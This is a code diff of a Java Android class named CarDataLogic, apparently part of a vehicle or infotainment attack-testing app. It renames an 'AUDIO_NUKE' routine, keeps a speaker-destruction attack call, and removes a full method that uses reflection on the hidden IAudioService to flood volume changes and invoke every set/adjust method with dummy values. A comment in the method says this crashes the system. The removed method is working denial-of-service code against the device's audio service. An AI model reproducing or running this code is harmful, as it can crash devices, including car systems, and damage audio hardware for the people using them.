@@ -2601,16 +2601,16 @@ public class CarDataLogic {
 
 
 
-// -------------------------------------------------------------------------------------------------------
+// --------------------------------------Audio System Attack-----------------------------------------------------------------
 
     public Result executeAudioSystemAttack() {
-        final String TAG = "AUDIO_NUKE";
-        final String attackId = "AUDIO_NUKE_" + System.currentTimeMillis();
+        final String TAG = "AUDIO_Attack";
+        final String attackId = "AUDIO_Attack_" + System.currentTimeMillis();
 
         try {
             android.content.Context ctx = getContextReflectively();
             if (ctx == null) {
-                return new Result("Audio Nuclear Attack (failed: no context)", new ArrayList<>());
+                return new Result("Audio System Attack (failed: no context)", new ArrayList<>());
             }
 
             alarmUi("INITIATING AUDIO SYSTEM ATTACK");
@@ -2692,8 +2692,6 @@ public class CarDataLogic {
                                 successCount.incrementAndGet();
                                 //2
                                 executeSpeakerDestructionAttack(finalAudioManager, ctx, finalThreadId);
-                                //3
-                                executeDirectAudioServiceAttack(ctx, finalThreadId);
 
 
                             } catch (Throwable t) {
@@ -2888,91 +2886,6 @@ public class CarDataLogic {
         }
 
         return buffer;
-    }
-
-
-    // ATTACK 3: AudioService Attack - Causes dead system on emulator
-    private void executeDirectAudioServiceAttack(android.content.Context ctx, int threadId) throws Exception {
-        try {
-            // Get IAudioService via ServiceManager
-            Class<?> serviceManagerClass = Class.forName("android.os.ServiceManager");
-            java.lang.reflect.Method getService = serviceManagerClass.getMethod(
-                    "getService", String.class
-            );
-
-            android.os.IBinder binder = (android.os.IBinder) getService.invoke(null, Context.AUDIO_SERVICE);
-
-            if (binder != null) {
-                // Get IAudioService interface
-                Class<?> iAudioServiceStub = Class.forName("android.media.IAudioService$Stub");
-                java.lang.reflect.Method asInterface = iAudioServiceStub.getMethod(
-                        "asInterface", android.os.IBinder.class
-                );
-
-                Object audioService = asInterface.invoke(null, binder);
-
-                if (audioService != null) {
-                    Class<?> iAudioServiceClass = Class.forName("android.media.IAudioService");
-
-                    // Call dangerous methods directly
-                    try {
-                        java.lang.reflect.Method adjustStreamVolume = iAudioServiceClass.getMethod(
-                                "adjustStreamVolume", int.class, int.class, int.class, String.class, String.class
-                        );
-
-                        // Flood with volume adjustments
-                        for (int i = 0; i < 1000; i++) {
-                            for (int stream = 0; stream < 10; stream++) {
-                                try {
-                                    adjustStreamVolume.invoke(audioService, stream, 1, 0,
-                                            ctx.getPackageName(), null);
-                                    adjustStreamVolume.invoke(audioService, stream, -1, 0,
-                                            ctx.getPackageName(), null);
-                                } catch (Throwable t) {
-                                    // Ignore
-                                }
-                            }
-                        }
-
-                    } catch (Throwable t) {
-                        // Method signature might be different
-                    }
-
-                    // Try to call other dangerous methods
-                    java.lang.reflect.Method[] methods = iAudioServiceClass.getMethods();
-                    for (java.lang.reflect.Method method : methods) {
-                        if (method.getName().contains("set") || method.getName().contains("adjust")) {
-                            try {
-                                // Call with dummy parameters
-                                java.lang.Class<?>[] paramTypes = method.getParameterTypes();
-                                Object[] params = new Object[paramTypes.length];
-
-                                // Fill with default values
-                                for (int i = 0; i < params.length; i++) {
-                                    if (paramTypes[i] == int.class) {
-                                        params[i] = 0;
-                                    } else if (paramTypes[i] == String.class) {
-                                        params[i] = ctx.getPackageName();
-                                    } else if (paramTypes[i] == boolean.class) {
-                                        params[i] = true;
-                                    } else {
-                                        params[i] = null;
-                                    }
-                                }
-
-                                // Call the method
-                                method.invoke(audioService, params);
-
-                            } catch (Throwable t) {
-                                // Ignore failures
-                            }
-                        }
-                    }
-                }
-            }
-        } catch (Throwable t) {
-            // ServiceManager access might fail
-        }
     }
 
 }
